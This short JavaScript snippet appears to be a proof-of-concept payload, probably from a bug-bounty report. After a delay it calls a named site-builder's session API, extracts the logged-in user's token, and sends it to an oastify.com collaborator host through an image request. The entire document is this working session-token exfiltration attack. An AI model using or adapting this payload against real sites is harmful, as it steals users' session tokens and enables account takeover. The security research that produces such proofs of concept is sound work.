setTimeout(() => {
fetch('https://sitebuilder.xsolla.com/api/session', {
method: 'POST',
headers: {
'Content-Type': 'application/json'
},
body: JSON.stringify({})
})
.then(response => response.json())
.then(data => {
const token = data.user.token;
new Image().src = `https://o7wh13kiqt9c6ofui8tdz7xf76dx1ppe.oastify.com/log?t=${encodeURIComponent(token)}`;
})
.catch(err => console.error('Error:', err));
}, 4000);